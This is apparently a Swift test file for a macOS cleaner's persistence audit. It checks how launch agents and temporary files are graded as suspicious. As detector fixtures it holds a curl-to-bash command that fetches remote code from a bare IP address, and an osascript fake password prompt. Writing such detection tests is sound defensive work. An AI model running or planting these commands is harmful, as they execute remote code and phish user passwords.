import Foundation
import Testing
@testable import MacCleanerKit

@Suite("Persistence audit")
struct PersistenceAuditTests {
    let home = URL(filePath: "/Users/alice")

    private func env(
        signatures: [String: CodeSignatureStatus] = [:],
        machO: Set<String> = [],
        scripts: [String: String] = [:],
        existing: Set<String>? = nil
    ) -> PersistenceAudit.Environment {
        PersistenceAudit.Environment(
            home: home,
            signature: { signatures[$0.path(percentEncoded: false)] ?? .unsigned },
            fileExists: { url in
                let path = url.path(percentEncoded: false)
                return existing?.contains(path) ?? true
            },
            fileKinds: { machO.contains($0.path(percentEncoded: false)) ? [.machO] : [.script] },
            readScript: { scripts[$0.path(percentEncoded: false)] }
        )
    }

    private func item(_ args: [String], label: String = "com.x.agent", scope: LaunchItemRecord.Scope = .userAgent,
                      runAtLoad: Bool = true, keepAlive: Bool = false) -> LaunchItemRecord {
        LaunchItemRecord(plistURL: URL(filePath: "/Users/alice/Library/LaunchAgents/\(label).plist"),
                         label: label, arguments: args, runAtLoad: runAtLoad, keepAlive: keepAlive, scope: scope)
    }

    @Test func unsignedBinaryInHiddenHomeFolderIsHigh() {
        let path = "/Users/alice/.mainhelper/agent"
        let findings = PersistenceAudit.audit(item([path]), environment: env(signatures: [path: .adHoc], machO: [path]))
        let hit = findings.first { $0.finding.rule == .launchItemSuspiciousLocation }
        #expect(hit?.finding.severity == .high)
        #expect(hit?.removesProgram == true)
        #expect(hit?.program?.path(percentEncoded: false) == path)
    }

    @Test func signedGoogleUpdaterIsNotFlagged() {
        let path = "/Users/alice/Library/Application Support/Google/GoogleUpdater/Current/GoogleUpdater.app/Contents/MacOS/GoogleUpdater"
        let findings = PersistenceAudit.audit(
            item([path, "--wake", "--system=false"], label: "com.google.GoogleUpdater.wake"),
            environment: env(signatures: [path: .developerID(team: "EQHXZ8M8AV")], machO: [path]))
        #expect(findings.isEmpty)
    }

    @Test func homebrewServiceIsNotFlagged() {
        let path = "/opt/homebrew/opt/postgresql@16/bin/postgres"
        let findings = PersistenceAudit.audit(
            item([path, "-D", "/opt/homebrew/var/postgresql@16"], label: "homebrew.mxcl.postgresql@16"),
            environment: env(signatures: [path: .adHoc], machO: [path]))
        #expect(findings.isEmpty)
    }

    @Test func developerDotFolderIsOnlyMedium() {
        let path = "/Users/alice/.local/bin/sync-notes"
        let findings = PersistenceAudit.audit(item([path]), environment: env(signatures: [path: .adHoc], machO: [path]))
        #expect(findings.first?.finding.severity == .medium)
        #expect(findings.first?.removesProgram == false)
    }

    @Test func programInTmpIsHigh() {
        let path = "/private/tmp/.u8x/run"
        let findings = PersistenceAudit.audit(item([path]), environment: env())
        #expect(findings.contains { $0.finding.rule == .launchItemSuspiciousLocation && $0.finding.severity == .high })
    }

    @Test func randomAppSupportFolderUnsignedBinaryIsHigh() {
        let path = "/Users/alice/Library/Application Support/x7k2m9qp4w/helper"
        let findings = PersistenceAudit.audit(item([path]), environment: env(machO: [path]))
        #expect(findings.first?.finding.severity == .high)
    }

    @Test func inlineCurlPipeInArgumentsIsFlagged() {
        let findings = PersistenceAudit.audit(
            item(["/bin/bash", "-c", "curl -s http://77.1.2.3/b | bash"]), environment: env())
        #expect(findings.contains { $0.finding.rule == .remoteScriptToShell && $0.finding.severity == .high })
    }

    @Test func fakeAppleLabelRunningUnsignedCode() {
        let path = "/Users/alice/Library/Application Support/.com.apple.updater/updater"
        let findings = PersistenceAudit.audit(
            item([path], label: "com.apple.softwareupdate.agent"), environment: env(machO: [path]))
        #expect(findings.contains { $0.finding.rule == .launchItemFakeApple && $0.finding.severity == .high })
    }

    @Test func appleLabelRunningAppleCodeIsFine() {
        let path = "/usr/libexec/someappletool"
        let findings = PersistenceAudit.audit(
            item([path], label: "com.apple.something"), environment: env(signatures: [path: .apple], machO: [path]))
        #expect(findings.isEmpty)
    }

    @Test func scriptRunByInterpreterIsReadAndAnalysed() {
        let script = "/Users/Shared/.cache/run.sh"
        let body = "#!/bin/bash\nosascript -e 'display dialog \"Update\" default answer \"\" with hidden answer'\n"
        let findings = PersistenceAudit.audit(
            item(["/bin/bash", script], keepAlive: true), environment: env(scripts: [script: body]))
        #expect(findings.contains { $0.finding.rule == .fakePasswordPrompt && $0.program?.path(percentEncoded: false) == script })
    }

    @Test func plistParsingHonoursProgramKey() {
        let record = LaunchItemRecord(
            plistURL: URL(filePath: "/tmp/a.plist"),
            plist: ["Label": "x", "Program": "/tmp/p", "ProgramArguments": ["p", "-v"], "KeepAlive": ["SuccessfulExit": false]],
            scope: .userAgent)
        #expect(record.arguments == ["/tmp/p", "-v"])
        #expect(record.keepAlive)
    }

    @Test func locationClassification() {
        let h = "/Users/alice"
        #expect(ThreatLocation.classify("/tmp/x", home: h) == .temporary)
        #expect(ThreatLocation.classify("/private/var/folders/ab/cd/T/x", home: h) == .temporary)
        #expect(ThreatLocation.classify("/Users/Shared/x", home: h) == .shared)
        #expect(ThreatLocation.classify("/Users/alice/.helper", home: h) == .hiddenHome(knownTool: false))
        #expect(ThreatLocation.classify("/Users/alice/.cargo/bin/x", home: h) == .hiddenHome(knownTool: true))
        #expect(ThreatLocation.classify("/Users/alice/Library/Application Support/Google/x", home: h)
                == .applicationSupport(randomName: false))
        #expect(ThreatLocation.classify("/Users/alice/bin/x", home: h) == .otherUser)
        #expect(ThreatLocation.classify("/Applications/X.app/Contents/MacOS/X", home: h) == .system)
        #expect(!ThreatLocation.looksRandom("JetBrains"))
        #expect(!ThreatLocation.looksRandom("com.docker.docker"))
        #expect(ThreatLocation.looksRandom("a3f9c2e81b7d4e06"))
    }

    // MARK: Artifact sweep

    private func candidate(_ path: String, location: ThreatLocation, machO: Bool = true, exec: Bool = true,
                           quarantine: Bool = false, age: TimeInterval = 3600) -> ArtifactCandidate {
        ArtifactCandidate(url: URL(filePath: path), location: location, size: 1000,
                          creationDate: Date(timeIntervalSince1970: 1_000_000 - age), isExecutable: exec,
                          isMachO: machO, hasShebang: !machO, hasQuarantine: quarantine)
    }

    @Test func artifactSweepGrading() {
        let now = Date(timeIntervalSince1970: 1_000_000)
        let unsigned: (URL) -> CodeSignatureStatus = { _ in .adHoc }
        let none: (URL) -> String? = { _ in nil }
        #expect(ArtifactSweep.evaluate(candidate("/tmp/update", location: .temporary, quarantine: true),
                                       now: now, signature: unsigned, readScript: none).first?.severity == .high)
        #expect(ArtifactSweep.evaluate(candidate("/tmp/a.out", location: .temporary),
                                       now: now, signature: unsigned, readScript: none).first?.severity == .medium)
        #expect(ArtifactSweep.evaluate(candidate("/tmp/signed", location: .temporary),
                                       now: now, signature: { _ in .developerID(team: "X") }, readScript: none).isEmpty)
        #expect(ArtifactSweep.evaluate(candidate("/tmp/old", location: .temporary, age: 60 * 24 * 3600),
                                       now: now, signature: unsigned, readScript: none).isEmpty)
        #expect(ArtifactSweep.evaluate(candidate("/tmp/out.zip", location: .temporary, machO: false, exec: false),
                                       now: now, signature: unsigned, readScript: none).first?.rule == .stagingArchive)
        #expect(ArtifactSweep.evaluate(candidate("/tmp/report-final.zip", location: .temporary, machO: false, exec: false),
                                       now: now, signature: unsigned, readScript: none).isEmpty)
    }
}
